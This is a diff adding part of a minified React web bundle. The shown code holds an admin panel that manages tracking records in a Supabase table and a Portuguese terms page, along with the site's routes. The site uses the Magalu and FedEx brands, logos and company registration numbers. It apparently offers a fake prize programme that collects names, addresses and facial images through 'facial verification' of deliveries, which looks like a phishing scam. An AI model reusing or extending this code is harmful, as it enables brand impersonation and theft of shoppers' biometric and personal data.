+                                            strokeLinejoin: "round",
+                                            children: (0, Te.jsx)("path", {
+                                                d: "M20 6L9 17l-5-5"
+                                            })
+                                        }), "Verificado"]
+                                    }) : (0, Te.jsxs)(Te.Fragment, {
+                                        children: [(0, Te.jsxs)("svg", {
+                                            width: "14",
+                                            height: "14",
+                                            viewBox: "0 0 24 24",
+                                            fill: "none",
+                                            stroke: "currentColor",
+                                            strokeWidth: "2.5",
+                                            strokeLinecap: "round",
+                                            strokeLinejoin: "round",
+                                            children: [(0, Te.jsx)("circle", {
+                                                cx: "12",
+                                                cy: "12",
+                                                r: "10"
+                                            }), (0, Te.jsx)("line", {
+                                                x1: "12",
+                                                y1: "8",
+                                                x2: "12",
+                                                y2: "12"
+                                            }), (0, Te.jsx)("line", {
+                                                x1: "12",
+                                                y1: "16",
+                                                x2: "12.01",
+                                                y2: "16"
+                                            })]
+                                        }), "Marcar Verificado"]
+                                    })
+                                }), (0, Te.jsx)("button", {
+                                    onClick: () => (async e => {
+                                        if (!window.confirm("⚠️ ATENÇÃO: Deseja realmente excluir o rastreamento ".concat(e, "?"))) return;
+                                        if (window.confirm("🔴 CONFIRMAÇÃO FINAL: Esta ação não pode ser desfeita!\n\nExcluir rastreamento ".concat(e, "?"))) {
+                                            try {
+                                                const {
+                                                    data: t,
+                                                    error: n
+                                                } = await ja.from("trackings_test").delete().eq("code", e).select();
+                                                n ? (console.error("❌ Erro ao deletar do Supabase:", n), alert("Erro ao deletar: ".concat(n.message, "\n\nOs dados podem estar protegidos por políticas RLS.")), localStorage.removeItem("tracking_".concat(e))) : (console.log("✅ Rastreamento deletado:", t), localStorage.removeItem("tracking_".concat(e)), alert("Rastreamento ".concat(e, " excluído com sucesso.")))
+                                            } catch (s) {
+                                                console.error("❌ Erro ao deletar:", s), alert("Erro ao deletar: ".concat(s.message)), localStorage.removeItem("tracking_".concat(e))
+                                            }
+                                            await g()
+                                        }
+                                    })(e.code),
+                                    className: "admin-button small danger",
+                                    children: "Excluir"
+                                })]
+                            })]
+                        }, e.code)))
+                    })]
+                })]
+            })]
+        }) : (0, Te.jsx)("div", {
+            className: "admin-container",
+            children: (0, Te.jsx)("div", {
+                className: "admin-login",
+                children: (0, Te.jsxs)("div", {
+                    className: "admin-login-card",
+                    children: [(0, Te.jsx)("h1", {
+                        className: "admin-title",
+                        children: "Área Administrativa"
+                    }), (0, Te.jsx)("p", {
+                        className: "admin-subtitle",
+                        children: "Acesso restrito"
+                    }), (0, Te.jsxs)("form", {
+                        onSubmit: v,
+                        className: "admin-form",
+                        children: [(0, Te.jsx)("input", {
+                            type: "password",
+                            placeholder: "Senha",
+                            value: n,
+                            onChange: e => {
+                                r(e.target.value), o("")
+                            },
+                            className: "admin-input",
+                            autoFocus: !0
+                        }), s && (0, Te.jsx)("div", {
+                            className: "admin-error",
+                            children: s
+                        }), (0, Te.jsx)("button", {
+                            type: "submit",
+                            className: "admin-button",
+                            children: "Entrar"
+                        })]
+                    })]
+                })
+            })
+        })
+    };
+
+    const Na = () => {
+        const e = re();
+        return (0, a.useEffect)(() => {
+            document.title = "FedEx - Termos e Condições"
+        }, []), (0, Te.jsxs)("div", {
+            className: "termos-container",
+            children: [(0, Te.jsx)("header", {
+                className: "termos-header",
+                children: (0, Te.jsxs)("div", {
+                    className: "termos-header-content",
+                    children: [(0, Te.jsxs)("div", {
+                        className: "termos-logo",
+                        children: [(0, Te.jsx)("img", {
+                            src: "/logo-magalu-azul (1).png",
+                            alt: "Magalu",
+                            className: "termos-logo-img"
+                        }), (0, Te.jsx)("img", {
+                            src: "/fedex.png",
+                            alt: "FedEx",
+                            className: "termos-logo-img"
+                        })]
+                    }), (0, Te.jsx)("button", {
+                        className: "termos-back-button",
+                        onClick: () => e("/"),
+                        children: "Voltar ao Início"
+                    })]
+                })
+            }), (0, Te.jsxs)("div", {
+                className: "termos-content",
+                children: [(0, Te.jsx)("h1", {
+                    className: "termos-title",
+                    children: "Termos e Condições"
+                }), (0, Te.jsx)("p", {
+                    className: "termos-updated",
+                    children: "Última atualização: 23 de fevereiro de 2025"
+                }), (0, Te.jsxs)("section", {
+                    className: "termos-section",
+                    children: [(0, Te.jsx)("h2", {
+                        className: "termos-section-title",
+                        children: "1. Aceitação dos Termos"
+                    }), (0, Te.jsx)("p", {
+                        className: "termos-text",
+                        children: "Ao acessar e utilizar este site, você concorda em cumprir e estar vinculado aos seguintes termos e condições de uso. Se você não concorda com qualquer parte destes termos, não deve utilizar este serviço."
+                    }), (0, Te.jsx)("p", {
+                        className: "termos-text",
+                        children: "Estes termos se aplicam a todos os visitantes, usuários e outras pessoas que acessam ou utilizam o serviço de rastreamento e verificação de entrega oferecido pela parceria entre Magalu (CNPJ: 47.960.950/0001-21) e FedEx (CNPJ: 10.970.887/0001-02)."
+                    })]
+                }), (0, Te.jsxs)("section", {
+                    className: "termos-section",
+                    children: [(0, Te.jsx)("h2", {
+                        className: "termos-section-title",
+                        children: "2. Programa de Bonificação Magalu"
+                    }), (0, Te.jsx)("h3", {
+                        className: "termos-subtitle",
+                        children: "2.1. Participação"
+                    }), (0, Te.jsx)("p", {
+                        className: "termos-text",
+                        children: "O Programa de Bonificação Magalu é uma iniciativa promocional que permite aos clientes participarem de sorteios e concorrerem a prêmios exclusivos ao confirmarem suas entregas através do sistema de verificação facial."
+                    }), (0, Te.jsx)("h3", {
+                        className: "termos-subtitle",
+                        children: "2.2. Como Participar"
+                    }), (0, Te.jsx)("p", {
+                        className: "termos-text",
+                        children: "Para participar do programa, você deve:"
+                    }), (0, Te.jsxs)("ul", {
+                        className: "termos-list",
+                        children: [(0, Te.jsx)("li", {
+                            children: "Ter realizado uma compra através da Magalu com entrega pela FedEx"
+                        }), (0, Te.jsx)("li", {
+                            children: "Confirmar a entrega através do sistema de verificação facial disponível neste site"
+                        }), (0, Te.jsx)("li", {
+                            children: "Fornecer os dados solicitados de forma correta e completa"
+                        }), (0, Te.jsx)("li", {
+                            children: "Aceitar estes termos e condições"
+                        })]
+                    }), (0, Te.jsx)("h3", {
+                        className: "termos-subtitle",
+                        children: "2.3. Prêmios"
+                    }), (0, Te.jsx)("p", {
+                        className: "termos-text",
+                        children: "Os prêmios disponíveis no programa incluem, mas não se limitam a: smartphones, tablets, vale-compras, descontos exclusivos e outros benefícios. A lista completa de prêmios e suas especificações serão divulgadas através dos canais oficiais da Magalu."
+                    }), (0, Te.jsx)("h3", {
+                        className: "termos-subtitle",
+                        children: "2.4. Sorteios"
+                    }), (0, Te.jsx)("p", {
+                        className: "termos-text",
+                        children: "Os sorteios serão realizados periodicamente conforme critérios estabelecidos pela Magalu. A cada confirmação de entrega, você acumula pontos de participação que aumentam suas chances de ganhar. Quanto mais entregas confirmadas, maiores são suas chances."
+                    }), (0, Te.jsx)("h3", {
+                        className: "termos-subtitle",
+                        children: "2.5. Elegibilidade"
+                    }), (0, Te.jsx)("p", {
+                        className: "termos-text",
+                        children: "Podem participar do programa pessoas físicas, maiores de 18 anos, residentes no Brasil. Funcionários da Magalu, FedEx e empresas parceiras não podem participar. A Magalu se reserva o direito de verificar a elegibilidade dos participantes."
+                    })]
+                }), (0, Te.jsxs)("section", {
+                    className: "termos-section",
+                    children: [(0, Te.jsx)("h2", {
+                        className: "termos-section-title",
+                        children: "3. Verificação Facial"
+                    }), (0, Te.jsx)("p", {
+                        className: "termos-text",
+                        children: "O sistema de verificação facial é utilizado para confirmar a identidade do destinatário e garantir a segurança das entregas. Ao utilizar este serviço, você concorda em:"
+                    }), (0, Te.jsxs)("ul", {
+                        className: "termos-list",
+                        children: [(0, Te.jsx)("li", {
+                            children: "Fornecer uma imagem facial clara e atualizada"
+                        }), (0, Te.jsx)("li", {
+                            children: "Permitir o uso de sua imagem para fins de verificação de entrega"
+                        }), (0, Te.jsx)("li", {
+                            children: "Compreender que os dados biométricos coletados serão utilizados exclusivamente para confirmação de entrega"
+                        }), (0, Te.jsx)("li", {
+                            children: "Autorizar o armazenamento temporário dos dados conforme política de privacidade"
+                        })]
+                    }), (0, Te.jsx)("p", {
+                        className: "termos-text",
+                        children: "Os dados coletados através da verificação facial são tratados de acordo com a Lei Geral de Proteção de Dados (LGPD) e nossa Política de Privacidade."
+                    })]
+                }), (0, Te.jsxs)("section", {
+                    className: "termos-section",
+                    children: [(0, Te.jsx)("h2", {
+                        className: "termos-section-title",
+                        children: "4. Rastreamento de Encomendas"
+                    }), (0, Te.jsx)("p", {
+                        className: "termos-text",
+                        children: "O serviço de rastreamento permite que você acompanhe o status de suas encomendas em tempo real. As informações de rastreamento são fornecidas pela FedEx e atualizadas conforme o progresso da entrega."
+                    }), (0, Te.jsx)("p", {
+                        className: "termos-text",
+                        children: "A Magalu e a FedEx não se responsabilizam por atrasos causados por fatores externos, incluindo mas não limitados a: condições climáticas, problemas de transporte, questões aduaneiras ou outras circunstâncias fora de seu controle."
+                    })]
+                }), (0, Te.jsxs)("section", {
+                    className: "termos-section",
+                    children: [(0, Te.jsx)("h2", {
+                        className: "termos-section-title",
+                        children: "5. Privacidade e Proteção de Dados"
+                    }), (0, Te.jsx)("p", {
+                        className: "termos-text",
+                        children: "A proteção de seus dados pessoais é uma prioridade. Todas as informações coletadas são tratadas de acordo com a Lei Geral de Proteção de Dados (Lei nº 13.709/2018) e nossa Política de Privacidade."
+                    }), (0, Te.jsx)("p", {
+                        className: "termos-text",
+                        children: "Os dados coletados incluem: nome, endereço, código de rastreamento, imagem facial para verificação e informações de entrega. Estes dados são utilizados exclusivamente para:"
+                    }), (0, Te.jsxs)("ul", {
+                        className: "termos-list",
+                        children: [(0, Te.jsx)("li", {
+                            children: "Processamento e confirmação de entregas"
+                        }), (0, Te.jsx)("li", {
+                            children: "Participação no programa de bonificação"
+                        }), (0, Te.jsx)("li", {
+                            children: "Melhoria dos serviços oferecidos"
+                        }), (0, Te.jsx)("li", {
+                            children: "Comunicação sobre status de entregas e prêmios"
+                        })]
+                    }), (0, Te.jsx)("p", {
+                        className: "termos-text",
+                        children: "Você tem o direito de acessar, corrigir, excluir ou solicitar a portabilidade de seus dados pessoais a qualquer momento, entrando em contato através dos canais de atendimento disponíveis."
+                    })]
+                }), (0, Te.jsxs)("section", {
+                    className: "termos-section",
+                    children: [(0, Te.jsx)("h2", {
+                        className: "termos-section-title",
+                        children: "6. Limitação de Responsabilidade"
+                    }), (0, Te.jsx)("p", {
+                        className: "termos-text",
+                        children: "A Magalu e a FedEx não se responsabilizam por:"
+                    }), (0, Te.jsxs)("ul", {
+                        className: "termos-list",
+                        children: [(0, Te.jsx)("li", {
+                            children: "Danos diretos, indiretos, incidentais ou consequenciais resultantes do uso ou impossibilidade de uso do serviço"
+                        }), (0, Te.jsx)("li", {
+                            children: "Perda de dados ou informações"
+                        }), (0, Te.jsx)("li", {
+                            children: "Interrupções ou falhas no serviço"
+                        }), (0, Te.jsx)("li", {
+                            children: "Decisões tomadas com base em informações fornecidas pelo serviço"
+                        }), (0, Te.jsx)("li", {
+                            children: "Problemas técnicos ou de conectividade"
+                        })]
+                    }), (0, Te.jsx)("p", {
+                        className: "termos-text",
+                        children: 'O serviço é fornecido "como está" e "conforme disponível", sem garantias de qualquer tipo, expressas ou implícitas.'
+                    })]
+                }), (0, Te.jsxs)("section", {
+                    className: "termos-section",
+                    children: [(0, Te.jsx)("h2", {
+                        className: "termos-section-title",
+                        children: "7. Propriedade Intelectual"
+                    }), (0, Te.jsx)("p", {
+                        className: "termos-text",
+                        children: "Todo o conteúdo deste site, incluindo mas não limitado a textos, gráficos, logos, ícones, imagens, clipes de áudio, downloads digitais e compilações de dados, é propriedade da Magalu, FedEx ou seus fornecedores de conteúdo e é protegido por leis de direitos autorais brasileiras e internacionais."
+                    }), (0, Te.jsx)("p", {
+                        className: "termos-text",
+                        children: "Você não pode reproduzir, distribuir, modificar, criar trabalhos derivados, exibir publicamente, executar publicamente, republicar, baixar, armazenar ou transmitir qualquer material do site sem autorização prévia por escrito."
+                    })]
+                }), (0, Te.jsxs)("section", {
+                    className: "termos-section",
+                    children: [(0, Te.jsx)("h2", {
+                        className: "termos-section-title",
+                        children: "8. Modificações dos Termos"
+                    }), (0, Te.jsx)("p", {
+                        className: "termos-text",
+                        children: "Reservamo-nos o direito de modificar estes termos a qualquer momento. As alterações entrarão em vigor imediatamente após sua publicação neste site. É sua responsabilidade revisar periodicamente estes termos para estar ciente de quaisquer modificações."
+                    }), (0, Te.jsx)("p", {
+                        className: "termos-text",
+                        children: "O uso continuado do serviço após a publicação de alterações constitui sua aceitação dos termos modificados."
+                    })]
+                }), (0, Te.jsxs)("section", {
+                    className: "termos-section",
+                    children: [(0, Te.jsx)("h2", {
+                        className: "termos-section-title",
+                        children: "9. Cancelamento e Encerramento"
+                    }), (0, Te.jsx)("p", {
+                        className: "termos-text",
+                        children: "Reservamo-nos o direito de encerrar ou suspender seu acesso ao serviço, sem aviso prévio, por qualquer motivo, incluindo mas não limitado a violação destes termos e condições."
+                    }), (0, Te.jsx)("p", {
+                        className: "termos-text",
+                        children: "Você pode encerrar sua participação no programa a qualquer momento, entrando em contato através dos canais de atendimento. No entanto, prêmios já acumulados podem ser perdidos conforme as regras do programa."
+                    })]
+                }), (0, Te.jsxs)("section", {
+                    className: "termos-section",
+                    children: [(0, Te.jsx)("h2", {
+                        className: "termos-section-title",
+                        children: "10. Lei Aplicável e Foro"
+                    }), (0, Te.jsx)("p", {
+                        className: "termos-text",
+                        children: "Estes termos e condições são regidos pelas leis da República Federativa do Brasil. Qualquer disputa relacionada a estes termos será resolvida exclusivamente nos tribunais competentes da cidade de São Paulo, Estado de São Paulo, renunciando as partes a qualquer outro foro, por mais privilegiado que seja."
+                    })]
+                }), (0, Te.jsxs)("section", {
+                    className: "termos-section",
+                    children: [(0, Te.jsx)("h2", {
+                        className: "termos-section-title",
+                        children: "11. Contato"
+                    }), (0, Te.jsx)("p", {
+                        className: "termos-text",
+                        children: "Para questões relacionadas a estes termos e condições, ao programa de bonificação ou aos serviços oferecidos, entre em contato:"
+                    }), (0, Te.jsxs)("div", {
+                        className: "termos-contact",
+                        children: [(0, Te.jsxs)("div", {
+                            className: "contact-item",
+                            children: [(0, Te.jsx)("strong", {
+                                children: "Magalu"
+                            }), (0, Te.jsx)("p", {
+                                children: "CNPJ: 47.960.950/0001-21"
+                            }), (0, Te.jsxs)("p", {
+                                children: ["Website: ", (0, Te.jsx)("a", {
+                                    href: "https://www.magazineluiza.com.br",
+                                    target: "_blank",
+                                    rel: "noopener noreferrer",
+                                    children: "www.magazineluiza.com.br"
+                                })]
+                            }), (0, Te.jsxs)("p", {
+                                children: ["Instagram: ", (0, Te.jsx)("a", {
+                                    href: "https://www.instagram.com/magalu/",
+                                    target: "_blank",
+                                    rel: "noopener noreferrer",
+                                    children: "@magalu"
+                                })]
+                            })]
+                        }), (0, Te.jsxs)("div", {
+                            className: "contact-item",
+                            children: [(0, Te.jsx)("strong", {
+                                children: "FedEx"
+                            }), (0, Te.jsx)("p", {
+                                children: "CNPJ: 10.970.887/0001-02"
+                            }), (0, Te.jsxs)("p", {
+                                children: ["Website: ", (0, Te.jsx)("a", {
+                                    href: "https://www.fedex.com/pt-br/home.html",
+                                    target: "_blank",
+                                    rel: "noopener noreferrer",
+                                    children: "www.fedex.com"
+                                })]
+                            }), (0, Te.jsxs)("p", {
+                                children: ["Instagram: ", (0, Te.jsx)("a", {
+                                    href: "https://www.instagram.com/fedex/",
+                                    target: "_blank",
+                                    rel: "noopener noreferrer",
+                                    children: "@fedex"
+                                })]
+                            })]
+                        })]
+                    })]
+                }), (0, Te.jsxs)("section", {
+                    className: "termos-section",
+                    children: [(0, Te.jsx)("h2", {
+                        className: "termos-section-title",
+                        children: "12. Disposições Gerais"
+                    }), (0, Te.jsx)("p", {
+                        className: "termos-text",
+                        children: "Se qualquer disposição destes termos for considerada inválida ou inexequível, as demais disposições permanecerão em pleno vigor e efeito. A falha em exercer qualquer direito ou disposição destes termos não constituirá uma renúncia a tal direito ou disposição."
+                    }), (0, Te.jsx)("p", {
+                        className: "termos-text",
+                        children: "Estes termos constituem o acordo completo entre você e a parceria Magalu/FedEx em relação ao uso do serviço e substituem todos os acordos anteriores ou contemporâneos."
+                    })]
+                }), (0, Te.jsx)("div", {
+                    className: "termos-actions",
+                    children: (0, Te.jsx)("button", {
+                        className: "termos-button",
+                        onClick: () => e("/"),
+                        children: "Voltar ao Início"
+                    })
+                })]
+            }), (0, Te.jsx)("footer", {
+                className: "termos-footer",
+                children: (0, Te.jsxs)("div", {
+                    className: "termos-footer-content",
+                    children: [(0, Te.jsx)("p", {
+                        className: "termos-footer-text",
+                        children: "© 2025 Parceria Magalu e FedEx. Todos os direitos reservados."
+                    }), (0, Te.jsxs)("div", {
+                        className: "termos-footer-cnpj",
+                        children: [(0, Te.jsx)("span", {
+                            children: "Magalu: CNPJ 47.960.950/0001-21"
+                        }), (0, Te.jsx)("span", {
+                            children: "FedEx: CNPJ 10.970.887/0001-02"
+                        })]
+                    })]
+                })
+            })]
+        })
+    };
+
+    const Ra = () => (0, Te.jsxs)(be, {
+        children: [(0, Te.jsx)(ve, {
+            path: "/",
+            element: (0, Te.jsx)(Ce, {})
+        }), (0, Te.jsx)(ve, {
+            path: "/verificacao",
+            element: (0, Te.jsx)(Pe, {})
+        }), (0, Te.jsx)(ve, {
+            path: "/sucesso",
+            element: (0, Te.jsx)(Oe, {})
+        }), (0, Te.jsx)(ve, {
+            path: "/rastreamento/:trackingCode",
+            element: (0, Te.jsx)(Ta, {})
+        }), (0, Te.jsx)(ve, {
+            path: "/admin",
+            element: (0, Te.jsx)(Ca, {})
+        }), (0, Te.jsx)(ve, {
+            path: "/termos",
+            element: (0, Te.jsx)(Na, {})
+        })]
+    });
+
+    const Pa = function() {
+        return (0, Te.jsx)(Se, {
+            children: (0, Te.jsx)(Ra, {})
+        })
+    };
+    o.createRoot(document.getElementById("root")).render((0, Te.jsx)(a.StrictMode, {
+        children: (0, Te.jsx)(Pa, {})
+    }))
+})();
 //# sourceMappingURL=main.9dcfcc1e.js.map
